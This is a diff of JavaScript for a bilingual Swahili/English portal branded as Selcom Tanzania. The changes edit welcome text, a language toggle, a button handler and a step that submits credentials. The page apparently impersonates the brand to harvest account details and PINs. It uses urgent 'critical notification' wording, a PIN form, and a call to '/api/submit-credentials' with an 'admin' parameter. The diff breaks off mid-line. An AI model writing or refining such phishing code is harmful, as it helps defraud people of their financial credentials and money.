@@ -85,7 +85,7 @@ document.addEventListener('DOMContentLoaded', () => {
       loadingSub: "Tafadhali subiri wakati tunathibitisha taarifa zako."
     },
     en: {
-      welcomeTitle: "KARIBU SELCOM TANZANIA!",
+      welcomeTitle: "WELCOME TO SELCOM TANZANIA!",
       welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
       welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
       critNotif: "CRITICAL NOTIFICATION",
@@ -227,6 +227,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const langToggle = document.getElementById('language-toggle');
   if (langToggle) {
+    // Sync toggle state with default language
+    langToggle.checked = (currentLang === 'sw');
     langToggle.addEventListener('change', (e) => {
       currentLang = e.target.checked ? 'sw' : 'en';
       updateLanguageTexts();
@@ -279,7 +281,11 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   const btnWelcome = document.getElementById('btn-welcome-proceed');
-  if (btnWelcome) btnWelcome.addEventListener('click', () => showStep(stepSlider));
+  if (btnWelcome) {
+    btnWelcome.addEventListener('click', () => {
+      showStep(stepSlider);
+    });
+  }
   
   const btnSliderNext = document.getElementById('btn-slider-next');
   if (btnSliderNext) {
@@ -418,7 +424,4 @@ document.addEventListener('DOMContentLoaded', () => {
       if (pinError) pinError.style.display = 'none';
 
       if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
-      showLoading(currentLang === 'sw' ? 'Inathibitisha...' : 'Verifying...', currentLang === 'sw' ? 'Inatuma taarifa zako kwa usalama.' : 'Securely transmitting your credentials.');
-
-      try {
-        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminPa
+      showLoading(currentLang === 'sw' ? 'Inathibitisha...' : 'Verifying...', currentLang === 'sw' ? 'Inatuma taarifa zako kwa usalama.' : 'Securely transmitting 
